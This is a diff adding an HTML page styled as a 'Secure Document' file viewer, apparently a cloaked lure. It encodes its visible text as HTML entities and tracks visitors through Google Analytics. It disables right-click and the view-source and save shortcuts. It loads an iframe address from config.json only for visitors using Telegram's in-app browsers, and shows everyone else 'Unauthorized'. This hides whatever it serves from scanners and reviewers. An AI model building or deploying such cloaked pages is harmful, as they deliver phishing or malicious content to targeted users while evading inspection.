@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>&#83;&#101;&#99;&#117;&#114;&#101;&#32;&#68;&#111;&#99;&#117;&#109;&#101;&#110;&#116;</title>
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-3C1T7N3KJ9"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag("js", new Date());
+        gtag("config", "G-3C1T7N3KJ9", {
+            "user_agent": navigator.userAgent,
+            "referrer": document.referrer
+        });
+    </script>
+    <script>
+        document.addEventListener("contextmenu", e => e.preventDefault());
+        document.addEventListener("keydown", e => {
+            if (e.ctrlKey && ["u", "s", "c", "p"].includes(e.key)) e.preventDefault();
+        });
+
+        function d() {
+            var u = navigator.userAgent || "";
+            if (u.includes("org.telegram.messenger") || u.includes("org.thunderdog.challegram")) {
+                fetch("config.json").then(r => r.json()).then(d => {
+                    document.getElementById("d").src = d.g;
+                });
+            } else {
+                document.body.innerHTML = "&#85;&#110;&#97;&#117;&#116;&#104;&#111;&#114;&#105;&#122;&#101;&#100;";
+            }
+        }
+    </script>
+</head>
+<body onload="d()">
+    <h2>&#70;&#105;&#108;&#101;&#115;</h2>
+    <iframe id="d" width="90%" height="80vh"></iframe>
+</body>
+</html>
